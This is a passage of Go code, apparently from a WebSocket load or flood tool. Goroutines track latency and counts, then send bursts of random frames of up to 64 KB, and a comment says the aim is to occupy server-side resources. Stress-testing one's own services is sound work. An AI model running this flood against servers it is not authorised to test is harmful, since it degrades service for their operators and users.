					atomic.AddInt64(totalErrors, 1)
					atomic.AddInt64(totalSent, 1)
					time.Sleep(100 * time.Millisecond)
					continue
				}
				atomic.AddInt64(activeConn, 1)
				latency := time.Since(start).Nanoseconds()
				atomic.AddInt64(totalLatency, latency)
				updateMinMax(minLat, maxLat, latency)
				atomic.AddInt64(bytesSent, int64(300))
				atomic.AddInt64(totalSent, 1)
				atomic.AddInt64(totalSuccess, 1)

				// 持续发送随机消息占用服务端资源
				msgSize := config.BodySize
				if msgSize <= 0 {
					msgSize = 1
				}
				if msgSize > 64 {
					msgSize = 64 // 最大 64KB 单帧
				}
				msg := make([]byte, msgSize*1024)
				rand.Read(msg)

				for k := 0; k < 100; k++ {
					select {
					case <-ctx.Done():
						c.Close()
						atomic.AddInt64(activeConn, -1)
						return
					default:
					}
					c.SetWriteDeadline(time.Now().Add(3 * time.Second))
					if err := c.WriteMessage(websocket.TextMessage, msg); err != nil {
						break
					}
					atomic.AddInt64(totalSent, 1)
					atomic.AddInt64(totalSuccess, 1)
					atomic.AddInt64(bytesSent, int64(len(msg)))
					time.Sleep(time.Duration(50+rand.Intn(100)) * time.Millisecond)
				}
				c.Close()
				atomic.AddInt64(activeConn, -1)
			}
		}()
	}
}
